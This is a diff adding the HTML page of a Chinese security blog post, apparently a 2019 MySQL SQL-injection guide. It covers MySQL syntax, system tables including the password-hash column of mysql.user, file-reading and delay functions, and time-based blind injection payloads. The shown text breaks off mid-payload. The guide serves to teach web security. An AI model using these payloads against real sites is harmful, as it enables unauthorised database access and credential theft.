@@ -1,0 +1,1282 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="接触 MySQL 注入的时间也很久了。刚开始接触的时候总是能见到各种各样的 payload，不但琐碎而且不成体系。我在不断收集的过程中发现实际上很多技巧都是根据语法来的。即如果知道基本语法，那么对注入的 payload 也就能了然于胸。 MySQL 语法 基础语法 我花了一点时间看了一下 MySQL 的语法，并绘制了一个导图：  这个图怎么看呢？首先，语法为从上到下。 简化之前的导图为 MySQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL 注入指北">
+<meta property="og:url" content="https://www.tr0y.wang/2019/03/25/MySQL%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="接触 MySQL 注入的时间也很久了。刚开始接触的时候总是能见到各种各样的 payload，不但琐碎而且不成体系。我在不断收集的过程中发现实际上很多技巧都是根据语法来的。即如果知道基本语法，那么对注入的 payload 也就能了然于胸。 MySQL 语法 基础语法 我花了一点时间看了一下 MySQL 的语法，并绘制了一个导图：  这个图怎么看呢？首先，语法为从上到下。 简化之前的导图为 MySQL">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
+<meta property="article:published_time" content="2019-03-25T13:54:22.000Z">
+<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
+  
+  
+  
+  <title>MySQL 注入指北 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MySQL 注入指北"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-03-25 13:54" pubdate>
+          2019年3月25日 13:54:22
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MySQL 注入指北</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>接触 MySQL 注入的时间也很久了。刚开始接触的时候总是能见到各种各样的 payload，不但琐碎而且不成体系。我在不断收集的过程中发现实际上很多技巧都是根据语法来的。即如果知道基本语法，那么对注入的 payload 也就能了然于胸。</p>
+<h2 id="mysql-语法">MySQL 语法</h2>
+<h3 id="基础语法">基础语法</h3>
+<p>我花了一点时间看了一下 MySQL 的语法，并绘制了一个导图：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/MySQL%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/20190407031440214.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这个图怎么看呢？首先，语法为从上到下。</p>
+<p>简化之前的导图为 MySQL 所有的语法。其实在注入的过程中用不着这么详细，看看就好，有需要再查也不迟。简化的版本则为 MySQL 注入中常见的语法。</p>
+<p>颜色表示：红色代表一定不能省略，橙色代表部分情况下能省略，灰色代表总是可以省略。红色与灰色好懂，橙色是个啥呢？拿 <code>GROUP BY</code> 为例，意思指的是，假如我们选了 <code>GROUP BY</code>，那么一定要对 <code>col_name</code>、<code>expr</code>、<code>position</code> 进行三选一。根据从上到下的顺序，接下来是 <code>ASC</code>、<code>DESC</code> 二选一，可选可不选。如果我们没使用 <code>GROUP BY</code>，那么就不需要进行三选一，因为流程没到这里。总结起来就是，如果下一步中存在橙色的语法，就一定要用到。</p>
+<h3 id="细节">细节</h3>
+<ol type="1">
+<li>group by：select + group by 的时候，是先 group by，再从 group by 里 select。所以 select 的列一定要在 group by 里存在。</li>
+<li>语句执行成功返回值有2种情况，第一种本身返回数字的，就为数字，即：<code>select (select database());</code> 的返回值为 1；否则，执行成功为 0，反之为 1。即：<code>select (select database());</code> 的返回值为 0</li>
+</ol>
+<h2 id="助攻数据库">助攻数据库</h2>
+<p>系统自带的数据库能给我们提供很多的信息。</p>
+<h3 id="information_schema">information_schema</h3>
+<p><code>information_schema</code> 提供了访问数据库元数据的方式。什么是<code>元数据</code>呢？就是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p>
+<p>有用的表如下：</p>
+<ul>
+<li>SCHEMATA：提供了当前 mysql 实例中所有数据库的信息。'show databases;<code>的结果就是从这个表的</code>SCHEMA_NAME` 字段来的。</li>
+<li>TABLES：详细记载了所有的表的名字，以及哪个表属于哪个 schema、表的类型、表的引擎、创建时间等等信息。<code>show tables</code> 的结果就是从这个表的 <code>TABLE_NAME</code> 字段来的。</li>
+</ul>
+<h3 id="mysql">mysql</h3>
+<p><code>mysql</code> 数据库是 mysql 的核心数据库，，主要负责存储数据库的用户、权限设置、关键字等 mysql 自己需要使用的控制和管理信息。</p>
+<p>有用的表如下：</p>
+<ul>
+<li>user：<code>user</code> 表中记录了用户信息，包括用户可登陆的 ip（host 字段）、用户名（User 字段）、密码 hash（authentication_string 字段）、是否有读取文件的权限（file_priv 字段）等等。注意，对于 mysql <code>5.7</code> 以上的版本，密码的 hash 字段不再是 <code>Password</code>，而是 <code>authentication_string</code>。</li>
+</ul>
+<h2 id="助攻变量">助攻变量</h2>
+<p>MySQL 自带的变量的特征就是开头 <code>@@</code></p>
+<ol type="1">
+<li><code>@@basedir</code>：MySQL 的安装路径</li>
+<li><code>@@datadir</code>： MySQL 的数据库文件，即数据文件路径</li>
+<li><code>@@version_compile_os</code>：操作系统</li>
+<li><code>@@version</code>：数据库版本</li>
+</ol>
+<h2 id="助攻函数">助攻函数</h2>
+<p>这些函数在注入的过程中能帮助我们不少忙。参数通常可以为 sql 语句（要加括号）</p>
+<h3 id="特殊函数">特殊函数</h3>
+<ul>
+<li><code>user()</code>：当前连接的数据库用户</li>
+<li><code>version()</code>：数据库版本</li>
+</ul>
+<h3 id="字符串相关函数">字符串相关函数</h3>
+<ul>
+<li>mid：
+<ul>
+<li>截取字符串的一部分</li>
+<li><code>mid(string, start[, length])</code>
+<ul>
+<li>string：字符串，</li>
+<li>start：起始位置，起始位置为 1</li>
+<li>length：截取长度</li>
+</ul></li>
+</ul></li>
+<li>substr：
+<ul>
+<li>截取字符串的一部分</li>
+<li><code>substr(string, start, length)</code>
+<ul>
+<li>string：字符串</li>
+<li>start：起始位置，起始位置为 1</li>
+<li>length：截取长度</li>
+</ul></li>
+</ul></li>
+<li>substring：同 <code>substr</code></li>
+</ul>
+<p><strong>以上函数的参数均可以用 <code>from start for end</code> 代替</strong>，如：<br />
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select substring(&#x27;abc&#x27; from 2 for 1); # 从 &#x27;abc&#x27; 的第二个字符开始截取，截取长度为 1</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| substring(&#x27;abc&#x27; from 2 for 1) |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| b                             |</span><br><span class="hljs-section">+-------------------------------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure></p>
+<ul>
+<li>hex：将数字/字符串转为<code>十六进制</code>。特别是字符串，防止有特殊字符导致出现各种奇怪的问题。</li>
+<li>unhex：将十六进制转为字符串。注意，结果会直接转为对应的 acii 码，例如 <code>unhex(6D7973716C)</code> 的结果是 <code>mysql</code> 而不是 <code>470189044076</code></li>
+<li>length：
+<ul>
+<li>返回字符串长度</li>
+<li><code>length(string)</code>
+<ul>
+<li>string：字符串</li>
+</ul></li>
+</ul></li>
+<li>left：
+<ul>
+<li>获取字符串左边数起指定个数的字符</li>
+<li><code>left(string, n)</code>
+<ul>
+<li>string：要截取的字符串</li>
+<li>n：长度</li>
+</ul></li>
+</ul></li>
+<li>ord：
+<ul>
+<li>获取字符的 ASCII 码</li>
+<li><code>ord(char)</code>
+<ul>
+<li>char：字符/字符串（如果是字符串，则取它的第一个字符）</li>
+</ul></li>
+</ul></li>
+<li>ascii：同 <code>ord</code></li>
+<li>char：
+<ul>
+<li>将 ASCII 码转为字符</li>
+<li><code>char(a[, ...])</code>
+<ul>
+<li>a：数字；后面可以加多个 ASCII 码，即构成字符串。</li>
+</ul></li>
+</ul></li>
+<li>regexp：
+<ul>
+<li>正则匹配，匹配到返回 1，反之为 0</li>
+<li><code>string1 regexp string2</code>
+<ul>
+<li>string1：匹配的字符串</li>
+<li>string2：正则表达式</li>
+</ul></li>
+</ul></li>
+<li>concat：
+<ul>
+<li>连接（多个）字符串（数字），返回字符串。如果有任何一个参数为 null，则返回值为 null</li>
+<li><code>concat(string[, ...])</code>
+<ul>
+<li>string：任意值</li>
+</ul></li>
+</ul></li>
+<li>concat_ws
+<ul>
+<li>和 concat 类似，将多个字符串连接成一个字符串，但是可以指定连接符。如果有任何一个参数为 null，对返回值无影响</li>
+<li><code>concat_ws(sep, string[, ...])</code>
+<ul>
+<li>sep：连接符</li>
+<li>string：任意值</li>
+</ul></li>
+</ul></li>
+<li>group_concat
+<ul>
+<li>将 group by 产生的同一个分组中的值连接起来，成为一个字符串并返回</li>
+<li><code>group_concat([distinct] colname [order by colname asc/desc ][separator sep])</code>
+<ul>
+<li>distinct：去重</li>
+<li>colname：列名</li>
+<li>sep：分隔符</li>
+</ul></li>
+</ul></li>
+</ul>
+<h3 id="延时函数">延时函数</h3>
+<ul>
+<li>sleep：
+<ul>
+<li>延迟</li>
+<li><code>sleep(sec)</code>
+<ul>
+<li>sec：秒</li>
+</ul></li>
+</ul></li>
+<li>banchmark：
+<ul>
+<li>重复执行函数，较占用 cpu</li>
+<li><code>banchmark(count, func)</code>
+<ul>
+<li>count：执行的次数</li>
+<li>func：函数</li>
+</ul></li>
+</ul></li>
+</ul>
+<p>另外，利用 <code>带外通道</code> 发起网络请求，也有可能造成时延。不过 MySQL 的带外通道只能在 Windows 下利用 <code>LOAD_FILE</code> 完成。</p>
+<h3 id="数学函数">数学函数</h3>
+<ul>
+<li>log</li>
+<li>exp<br />
+...</li>
+</ul>
+<h3 id="聚合函数">聚合函数</h3>
+<ul>
+<li>count</li>
+<li>sum</li>
+<li>...</li>
+</ul>
+<h3 id="其他函数">其他函数</h3>
+<ul>
+<li>greatest：
+<ul>
+<li>返回 a, b 中最大的值</li>
+<li><code>greatest(a, b)</code>
+<ul>
+<li>a、b：任意值</li>
+</ul></li>
+</ul></li>
+<li>rand：
+<ul>
+<li>返回 0~1 之间随机的浮点值</li>
+<li><code>rand(a)</code>
+<ul>
+<li>a：可选参数；随机数种子；可为任意值</li>
+</ul></li>
+</ul></li>
+<li>load_file
+<ul>
+<li>读取文件内容</li>
+<li><code>load_file(path)</code>
+<ul>
+<li>path：文件路径，一般转为 16 进制防止特殊字符出问题</li>
+</ul></li>
+</ul></li>
+<li>extractvalue
+<ul>
+<li>对 XML 文档进行查询</li>
+<li><code>extractvalue(xmlfile，path)</code>
+<ul>
+<li>xmlfile：xml 文件</li>
+<li>path：xpath</li>
+</ul></li>
+</ul></li>
+<li>updatexml
+<ul>
+<li>更新 xml</li>
+<li><code>updatexml(xmlfile，path, content)</code>
+<ul>
+<li>xmlfile：xml 文件</li>
+<li>path：xpath</li>
+<li>content：更新的内容</li>
+</ul></li>
+</ul></li>
+</ul>
+<h2 id="注入类型">注入类型</h2>
+<p>到此为止，我们基本上复习了一下 MySQL 注入相关的知识，接下来看看有哪些类型的注入。</p>
+<h3 id="常规注入">常规注入</h3>
+<p>注入后直接回显结果</p>
+<h3 id="盲注">盲注</h3>
+<p>类型</p>
+<ul>
+<li>布尔</li>
+<li>时间</li>
+<li>其他（报错、响应代码等等）</li>
+</ul>
+<p>盲注就是在 sql 注入过程中，数据无回显。此时，我们需要利用一些方法进行判断注入是否成功，这个方法称之为盲注。</p>
+<p>盲注实际上是根据执行成功与失败的现象不同，导致攻击者能够获取到信息。最简单的是布尔型的，通过比较运算符来获得信息，比较结果要么是 True，要么是 False，两种返回的数据不同。那么如果不管是 True 还是 False，页面返回的都一样的话，就只能用基于时间的盲注，加入特定的时间函数，通过时间差来判断注入的语句是否正确。</p>
+<p>从上面可以看出，只要注入成功与失败的返回数据不同，我们就可以获取到数据库的信息。至于返回的数据到底怎么个不同法，则有很多种可能。</p>
+<p>利用方式</p>
+<ol type="1">
+<li><p>基于布尔<br />
+利用字符串相关的函数，逐个字符猜解需要的信息即可</p></li>
+<li><p>基于时间</p>
+<ul>
+<li>利用 <code>if</code>、<code>case</code>等与时延函数搭配，逐个字符猜解需要的信息</li>
+<li>利用字符串提前与定位将字符转为数字<br />
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(locate(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;a&#x27;</span>));<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(locate(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;b&#x27;</span>));<br>...<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(locate(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;r&#x27;</span>));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><br />
+同理可以获取所有位数。此法无需 if 等条件语句。<br />
+同样还可以：<br />
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>));<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">1</span>));<br>...<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-number">1</span>));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><br />
+判断长度也可以这样：<br />
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-built_in">length</span>(<span class="hljs-keyword">user</span>())<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-built_in">length</span>(<span class="hljs-keyword">user</span>())<span class="hljs-number">-2</span>);<br>...<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-built_in">length</span>(<span class="hljs-keyword">user</span>())<span 